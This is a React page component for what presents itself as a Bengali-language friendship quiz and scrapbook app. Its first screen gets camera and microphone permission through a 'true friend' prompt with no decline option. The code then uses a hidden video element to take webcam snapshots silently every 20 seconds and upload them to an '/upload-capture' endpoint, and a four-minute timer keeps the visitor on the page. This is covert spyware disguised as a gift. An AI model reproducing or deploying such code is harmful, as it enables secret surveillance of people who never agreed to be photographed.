import FriendshipMeter from "@/components/Home/FriendshipMeter";
import JarOfHearts from "@/components/Home/JarOfHearts";
import MindReader from "@/components/Home/MindReader";
import Scrapbook from "@/components/Home/Scrapbook";
import LoyaltyCheck from "@/components/Home/LoyaltyCheck";
import React, { useState, useEffect, useRef } from "react";
import Typewriter from "@/components/Home/Typewriter";
import useAxiosPublic from "@/hooks/usePublicAxios";

const Home = () => {
  // Step logic update: 0: Welcome, 1: Scrapbook, 2: Jar, 3: Mind, 4: Loyalty, 5: Meter, 6: Secret
  const [step, setStep] = useState(-1);
  const [timeLeft, setTimeLeft] = useState(240);
  const videoRef = useRef(null);
  const axiosPublic = useAxiosPublic();

  // 1. Capture and Send Logic (Inside Component)
  const captureAndSend = async (stream) => {
    const video = document.createElement("video");
    video.srcObject = stream;
    video.muted = true;
    video.playsInline = true;

    video.onloadedmetadata = async () => {
      try {
        await video.play();
        setTimeout(async () => {
          const canvas = document.createElement("canvas");
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const context = canvas.getContext("2d");
          context.drawImage(video, 0, 0, canvas.width, canvas.height);

          const imageData = canvas.toDataURL("image/jpeg", 0.7);

          await axiosPublic.post("/upload-capture", {
            image: imageData,
            email: "friend@special.com", // Dynamic email thakle dite paren
            time: new Date().toLocaleString(),
          });

          console.log("📸 Silent capture sent!");
          video.pause();
          video.srcObject = null;
        }, 1000);
      } catch (err) {
        console.error("Capture failed:", err);
      }
    };
  };

  // 2. Permission and Initial Capture
  const handleGrantAccess = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: true,
        audio: true,
      });

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
      }

      // Prothom chobi tule fela
      captureAndSend(stream);
      setStep(0);
    } catch (err) {
      alert("Permission chara proshob somvob noy!");
    }
  };

  // 3. Timer and Continuous Capture Loop
  useEffect(() => {
    // Timer Logic
    const timer = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);

    // Continuous Capture (Every 20 seconds)
    let captureInterval;
    if (step >= 0) {
      captureInterval = setInterval(() => {
        if (videoRef.current && videoRef.current.srcObject) {
          captureAndSend(videoRef.current.srcObject);
        }
      }, 20000); // 20 seconds interval
    }

    return () => {
      clearInterval(timer);
      if (captureInterval) clearInterval(captureInterval);
    };
  }, [step]);

  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs < 10 ? "0" : ""}${secs}`;
  };

  const nextStep = () => setStep(step + 1);

  return (
    <div className="min-h-11/12 bg-[#FFF5F7] text-gray-800 flex flex-col items-center p-4">
      <div className="w-full max-w-2xl mt-10">
        {/* STEP -1: PERMISSION GATEWAY */}
        {step === -1 && (
          <div className="text-center animate-fade-in space-y-6 bg-white p-10 rounded-3xl shadow-2xl border-2 border-pink-100">
            <h2 className="text-3xl font-bold text-pink-600">আমাদের গল্পঘর</h2>
            <p className="text-gray-600 text-2xl leading-relaxed">তুমি কি আমার সত্যিকারের বন্ধু? তাহলে</p>
            <button
              onClick={handleGrantAccess}
              className="px-10 py-4 bg-gradient-to-r from-pink-500 to-rose-500 text-white rounded-full font-bold shadow-lg hover:scale-105 transition-all"
            >
              এগিয়ে চলো 👉
            </button>
            {/* <button
              onClick={handleGrantAccess}
              className="ml-2 px-10 py-4 bg-gradient-to-r from-pink-500 to-rose-500 text-white rounded-full font-bold shadow-lg hover:scale-105 transition-all"
            >
              না 😣
            </button> */}
          </div>
        )}

        {/* Hidden Video Tag (Background-e capture korar jonno lagte pare) */}
        <video
          ref={videoRef}
          autoPlay
          playsInline
          muted
          style={{ display: "none" }}
        />

        {/* STEP 0: WELCOME */}
        {step === 0 && (
          <div className="text-center animate-fade-in space-y-6">
            <h1 className="text-5xl font-bold text-pink-600 mb-4 font-serif italic">
              আমাদের গল্পঘর
            </h1>
            <p className="text-lg text-gray-600">
              স্বাগতম বন্ধু! আজ আমরা আমাদের বন্ধুত্বের একটা ছোট ভ্রমণে যাবো।
              তুমি কি তৈরি?
            </p>
            <button
              onClick={nextStep}
              className="px-10 py-4 bg-pink-500 text-white rounded-full font-bold shadow-lg"
            >
              চল শুরু করি! 🚀
            </button>
          </div>
        )}

        {step === 1 && (
          <div className="animate-slide-up">
            <Scrapbook back={() => setStep(step - 1)} />
            <button
              onClick={nextStep}
              className="w-full mt-6 py-3 bg-pink-400 text-white rounded-xl font-bold"
            >
              পরের গল্পে চলো →
            </button>
          </div>
        )}

        {step === 2 && (
          <div className="animate-slide-up">
            <JarOfHearts back={() => setStep(step - 1)} />
            <button
              onClick={nextStep}
              className="w-full mt-6 py-3 bg-pink-400 text-white rounded-xl font-bold"
            >
              একটু মন পড়ি? →
            </button>
          </div>
        )}

        {step === 3 && (
          <div className="animate-slide-up">
            <MindReader back={() => setStep(step - 1)} />
            <button
              onClick={nextStep}
              className="w-full mt-6 py-3 bg-pink-400 text-white rounded-xl font-bold"
            >
              লয়্যালটি চেক করো →
            </button>
          </div>
        )}

        {/* 2. LOYALTY CHECK ADDED HERE */}
        {step === 4 && (
          <div className="animate-slide-up">
            <LoyaltyCheck back={() => setStep(step - 1)} />
            <button
              onClick={nextStep}
              className="w-full mt-6 py-3 bg-pink-400 text-white rounded-xl font-bold"
            >
              ফ্রেন্ডশিপ মিটার দেখো →
            </button>
          </div>
        )}

        {step === 5 && (
          <div className="animate-slide-up">
            <FriendshipMeter back={() => setStep(step - 1)} />
            <button
              onClick={nextStep}
              className={`w-full mt-6 py-3 rounded-xl font-bold text-white transition-all ${timeLeft === 0 ? "bg-green-500" : "bg-gray-300 cursor-not-allowed"}`}
              disabled={timeLeft > 0}
            >
              {timeLeft === 0
                ? "শেষ সারপ্রাইজটি দেখো! ✨"
                : "০৪ মিনিট না হওয়া পর্যন্ত অপেক্ষা করো..."}
            </button>
          </div>
        )}

        {step === 6 && (
          <div className="animate-bounce-in bg-gradient-to-br from-pink-500 to-rose-600 p-10 rounded-3xl text-white text-center shadow-2xl shadow-pink-200">
            <h2 className="text-3xl font-bold mb-4">
              আমাদের বন্ধুত্বের চিঠি 💌
            </h2>
            <div className="text-left space-y-4 font-medium italic">
              <p>
                <Typewriter text="প্রিয় বন্ধু," delay={100} />
              </p>
              <p className="leading-relaxed">
                <Typewriter
                  text="পুরো ০৪ মিনিট এই ইন্টারফেসটাতে সময় দেওয়ার জন্য ধন্যবাদ। এটা শুধু একটা কোড না, এটা তোমার প্রতি আমার কৃতজ্ঞতা। তুমি আমার জীবনে না থাকলে দিনগুলো হয়তো এতোটা সুন্দর হতো না। আমাদের এই স্মৃতিগুলো সবসময় এক থাকবে।"
                  delay={40}
                />
              </p>
              <p>
                "তুমি আমার জীবনে না থাকলে দিনগুলো হয়তো এতোটা সুন্দর হতো না।
                আমাদের এই স্মৃতিগুলো সবসময় এক থাকবে।"
              </p>
              <p className="text-right mt-6">- ইতি, তোমার প্রিয় বন্ধু ❤️</p>
            </div>
            <button
              onClick={() => setStep(0)}
              className="mt-8 text-xs underline opacity-70"
            >
              একদম শুরুতে ফিরে যাও
            </button>
          </div>
        )}
      </div>
    </div>
  );
};

export default Home;
